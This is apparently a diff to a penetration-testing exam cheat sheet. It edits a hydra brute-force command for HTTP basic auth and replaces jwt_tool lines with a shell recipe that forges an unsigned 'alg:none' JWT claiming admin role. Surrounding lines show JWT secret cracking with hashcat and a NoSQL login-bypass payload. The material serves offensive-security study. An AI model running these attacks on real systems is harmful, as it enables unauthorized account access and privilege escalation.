@@ -100,7 +100,7 @@ hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 
 
 Bruteforce with GET request
 ```bash
-hydra -l basic-auth-user -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 127.0.0.1 http-get /
+hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 127.0.0.1 http-get /
 ```
 
 ## 4) SQL Injection
@@ -1147,8 +1147,10 @@ username=admin&password[$ne]=x
 ```bash
 echo 'TOKEN' | cut -d. -f2 | base64 -d 2>/dev/null     # Inspect claims (add = padding if needed)
 hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt         # Crack weak HS256 secret
-jwt_tool TOKEN -X a                                               # alg:none attack
-jwt_tool TOKEN -T                                                 # Tamper claims (e.g. "role":"admin")
+# alg:none forge (jwt_tool not on exam Kali) — edit claims, empty signature, keep trailing dot:
+H=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+P=$(printf '{"user":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+echo "$H.$P."
 ```
 
 8. Header / verb tricks:
